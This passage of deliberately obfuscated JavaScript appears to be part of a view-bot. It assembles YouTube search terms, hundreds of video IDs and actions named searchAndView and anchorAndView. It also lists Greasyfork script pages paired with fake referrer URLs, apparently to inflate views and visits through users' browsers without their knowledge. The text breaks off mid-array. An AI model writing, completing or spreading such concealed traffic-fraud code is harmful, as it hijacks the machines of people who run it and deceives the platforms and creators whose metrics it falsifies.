searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + Y(0x20) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + Z(0x3) + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0x173b + -0x182d + 0x3 * 0x54)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xa36 + -0xf8c + 0x19cc * 0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1066 + 0x1 * 0x2509 + 0x210 * -0xa);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    Y(0x16) + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    Z(0x5) + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    a0(0x14, 'g9*C') + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    Y(0x18) + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    Z(0x4) + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    Y(0x1b) + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    Y(0xe) + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + Y(0x2) + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + Y(0x7) + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a0(0x10, 'R@aj') + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': Z(0xc) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
